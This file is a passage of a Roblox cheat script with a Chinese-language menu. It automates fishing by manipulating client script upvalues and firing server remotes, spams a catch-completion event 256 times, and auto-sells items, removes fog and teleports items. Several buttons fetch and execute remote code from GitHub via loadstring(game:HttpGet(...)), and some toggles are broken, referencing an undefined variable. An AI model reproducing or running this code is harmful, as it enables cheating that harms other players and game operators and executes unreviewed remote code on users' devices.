            if not character then return nil end

            for _, tool in ipairs(character:GetChildren()) do
                if tool:IsA("Tool") and (tool.Name:find("rod") or tool.Name:find("Rod")) then
                    return tool
                end
            end
            return nil
        end

        function farm.freeze_character(freeze)
            local character = localplayer.Character
            if character then
                local humanoid = character:FindFirstChildOfClass("Humanoid")
                if humanoid then
                    if freeze then
                        humanoid.WalkSpeed = 0
                        humanoid.JumpPower = 0
                    else
                        humanoid.WalkSpeed = 16  
                        humanoid.JumpPower = 50  
                    end
                end
            end
        end

        function farm.cast()
            local character = localplayer.Character
            if not character then return end

            local rod = farm.find_rod()
            if not rod then return end

            local args = { [1] = 100, [2] = 1 }
            rod.events.cast:FireServer(unpack(args))
            farm.cast_tick = 0  
        end

        function farm.shake()
            local shake_ui = playergui:FindFirstChild("shakeui")
            if shake_ui then
                local safezone = shake_ui:FindFirstChild("safezone")
                local button = safezone and safezone:FindFirstChild("button")

                if button then
                    if config.enableBigButton then
                        button.Size = UDim2.new(config.bigButtonScaleFactor, 0, config.bigButtonScaleFactor, 0)
                    else
                        button.Size = UDim2.new(1, 0, 1, 0)  
                    end

                    if button.Visible then
                        utility.simulate_click(
                            button.AbsolutePosition.X + button.AbsoluteSize.X / 2,
                            button.AbsolutePosition.Y + button.AbsoluteSize.Y / 2,
                            1
                        )
                    end
                end
            end
        end

        function farm.reel()
            local reel_ui = playergui:FindFirstChild("reel")
            if not reel_ui then return end

            local reel_bar = reel_ui:FindFirstChild("bar")
            if not reel_bar then return end

            local reel_client = reel_bar:FindFirstChild("reel")
            if not reel_client then return end

            if reel_client.Disabled == true then
                reel_client.Disabled = false
            end

            local update_colors = getsenv(reel_client).UpdateColors

            if update_colors then
                setupvalue(update_colors, 1, 100)
                replicated_storage.events.reelfinished:FireServer(getupvalue(update_colors, 1), true)
            end
        end

       
        fishingThread = spawn(function()
            while autoFishingEnabled do
                if not autoFishingEnabled then return end  

                local rod = farm.find_rod() 
                if rod then
                    if config.FreezeWhileFishing then
                        farm.freeze_character(true)
                    end
                    farm.cast()
                    farm.shake()
                    farm.reel()
                else
                    farm.freeze_character(false)
                end

                task.wait(config.shakeSpeed)  
            end

           
            farm.freeze_character(false)
        end)

       
        local function cleanup()
            if fishingThread then
                task.cancel(fishingThread)  
                fishingThread = nil
            end
            farm.freeze_character(false)  
        end

        
        if not autoFishingEnabled then
            cleanup()
        end
  end
})

Tab:AddToggle({
  Name = "秒钓",
  Default = false,
  Callback = function(Value)
  local Players = game:GetService("Players")
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local hasFired = false
    local connection  

    
    local function fireReelFinished()
        if not hasFired then
            hasFired = true
            for i = 1, 256 do
                ReplicatedStorage.events.reelfinished:FireServer(1000, true)
            end
        end
    end

   
    local function startListening()
        connection = Players.LocalPlayer:WaitForChild("PlayerGui").DescendantAdded:Connect(function(descendant)
            if descendant:IsA("Sound") and descendant.Name == "popup" then
                fireReelFinished()
                descendant.AncestryChanged:Connect(function(_, parent)
                    if not parent then
                        hasFired = false  
                        fireReelFinished()
                    end
                end)
            end
        end)
    end

    
    local function stopListening()
        if connection then
            connection:Disconnect()
            connection = nil
        end
        hasFired = false  
    end

   
    if Value then
        print("功能已启用")
        startListening()
    else
        print("功能已禁用")
        stopListening()
    end
  end
})

Tab:AddToggle({
	Name = "减少延迟",
	Default = false,
	Callback = function(Value)

    toggle = State
     if toggle then
        while toggle do 
            wait(30)
            for i, v in pairs(game.Workspace.DroppedItems:GetChildren()) do
                if v:IsA("Model") then
                    v:Destroy()
                end
            end
        end
      end
	end
})

Tab:AddToggle({
	Name = "自动锁定稀有物品",
	Default = false,
	Callback = function(Value)

    toggle = State
     if toggle then
        while toggle do 
            wait(.1)
for i, v in pairs(game.Players.LocalPlayer.PlayerGui.Interface.Inventory.Inventory.Frame.Backpack.List.Container:GetChildren()) do
        if string.match(v.Name, "key") then
            for i, model in pairs(v:GetDescendants()) do
                if model:IsA("Tool") then
                    if model.RarityLevel.Value >= 5 then

                        if v.DraggableComponent.Contents.LockIcon.Visible == false then
                            print(v.Name, model.Name, model.RarityLevel.Value)
                        local args = {
                            [1] = "Tools",
                            [2] = v.Name,
                            [3] = true
                        }
                        game:GetService("ReplicatedStorage").CloudFrameShared.DataStreams.SetInventoryItemLock:InvokeServer(unpack(args))

                        end
                    end
                end
            end
        end
end

        end
      end
	end
})

Tab:AddToggle({
	Name = "自动售卖",
	Default = false,
	Callback = function(Value)

toggle = State
    while toggle do
        wait(2.6)
        game:GetService("ReplicatedStorage").CloudFrameShared.DataStreams.processGameItemSold:InvokeServer("SellEverything")
    end
	end
})

Tab:AddToggle({
	Name = "去除雾气",
	Default = false,
	Callback = function(Value)

    toggle = State
        while toggle do
        if  game.Lighting.FogEnd == 100 then
         game.Lighting.FogEnd = 1000000
        end
            game.Lighting.FogEnd = 1000000
            game.Lighting.GlobalLighting:Destroy()
            game.Lighting.Atmosphere:Destroy()     
             game.Lighting.Lighting:Destroy()  
              game.Lighting.ColorCorrection:Destroy()     
               game.Lighting.Bloom:Destroy()     
                game.Lighting.Blur:Destroy()     
                 game.Lighting.Atmosphere:Destroy()                 
        end
	end
})

local Tab = Window:MakeTab({
    Name = "流亡",
    Icon = "rbxassetid://7734068321",
    PremiumOnly = false
})

Tab:AddButton({
  Name = "1",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/wdwahDWGU/DWAHUBUHD/refs/heads/main/EXILEDDHUA"))()
  end
})

local Tab = Window:MakeTab({
    Name = "妄想工作室",
    Icon = "rbxassetid://7734068321",
    PremiumOnly = false
})

Tab:AddButton({
  Name = "1",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/wdwahDWGU/DWAHUBUHD/refs/heads/main/DelusionalUWEBGJBD"))()
  end
})

local Tab = Window:MakeTab({
    Name = "恶魔学",
    Icon = "rbxassetid://7734068321",
    PremiumOnly = false
})

Tab:AddButton({
  Name = "1",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/wdwahDWGU/DWAHUBUHD/refs/heads/main/WDVHQVEH"))()
  end
})

local Tab = Window:MakeTab({
    Name = "穷小子打工记",
    Icon = "rbxassetid://7734068321",
    PremiumOnly = false
})

Tab:AddButton({
  Name = "1",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/wdwahDWGU/DWAHUBUHD/refs/heads/main/%E7%A9%B7%E5%B0%8F%E5%AD%90%E6%89%93%E5%B7%A5%E8%AE%B0"))()
  end
})

local Tab = Window:MakeTab({
    Name = "evide躲避",
    Icon = "rbxassetid://7734068321",
    PremiumOnly = false
})

Tab:AddButton({
  Name = "1",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/wdwahDWGU/DWAHUBUHD/refs/heads/main/EvadEDHUWEBA"))()
  end
})

Tab:AddButton({
  Name = "2",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/Dc2-masket27727/Mobile-s-Hub/main/Main/Hydra/Evade.exe"))();
  end
})

local Tab = Window:MakeTab({
    Name = "Refinery Caves",
    Icon = "rbxassetid://7734068321",
    PremiumOnly = false
})

Tab:AddButton({
  Name = "点击传送物品到家",
  Callback = function()
  local Tool = Instance.new("Tool", game:GetService("Players").LocalPlayer.Backpack)
	Tool.Name = "点击你想要传送的物品"
		Tool.RequiresHandle = false;
		
	Tool.Activated:connect(function()
	
		if lp:GetMouse().Target.Parent:FindFirstChild("Owner") then
			if lp:GetMouse().Target.Parent.Owner.Value==lp then
				
					for i, v in next,lp:GetMouse().Target.Parent:children() do
          if v.Name~="Configuration" or v.Name~="Link" or v.Name~="Shop" then
           
            game:GetService("ReplicatedStorage").Events.Ungrab:FireServer(v,{})
            v.CFrame=GetPlot()
game:GetService("ReplicatedStorage").Events.Ungrab:FireServer(v,{})
          end
        
					
				end
			end
				end
	end)
	Tool.Parent = game.Players.LocalPlayer.Backpack
  end
})

Tab:AddButton({
  Name = "寻找紫树",
  Callback = function()
  local find=false
	for _,v in pairs(game.Workspace:GetDescendants()) do
		if v.Name == "Interact" and v.Parent.Name == "Leaf" then
		    tp(v.Part.CFrame)
		local BillboardGui = Instance.new("BillboardGui")
		local TextLabel = Instance.new("TextLabel")
		BillboardGui.Parent = v.Parent
		BillboardGui.AlwaysOnTop = true
		BillboardGui.LightInfluence = 1
		BillboardGui.Size = UDim2.new(0, 50, 0, 50)
		BillboardGui.StudsOffset = Vector3.new(0, 2, 0)
		TextLabel.Parent = BillboardGui
		TextLabel.BackgroundColor3 = Color3.new(1, 1, 1)
		TextLabel.BackgroundTransparency = 1
		TextLabel.Size = UDim2.new(1, 0, 1, 0)
		TextLabel.Text = "紫树在这里"
		TextLabel.TextColor3 = Color3.new(1, 0, 0)
		TextLabel.TextScaled = true
		local find=true
		end
		end
		if find==false then
			notify("没有找到树",4)
			else
				notify("已找到树",4)
			

		end
  end
})

local Tab = Window:MakeTab({
    Name = "被遗弃",
    Icon = "rbxassetid://7734068321",
    PremiumOnly = false
})

Tab:AddButton({
  Name = "LN",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/ShenJiaoBen/Partial-Server-Ribbon/refs/heads/main/Forsaken.lua"))()
  end
})

local Tab = Window:MakeTab({
    Name = "格林维尔",
    Icon = "rbxassetid://7734068321",
    PremiumOnly = false
})

Tab:AddToggle({
	Name = "触摸地面",
	Default = false,
	Callback = function(Value)

TouchTheRoad = value
	end
})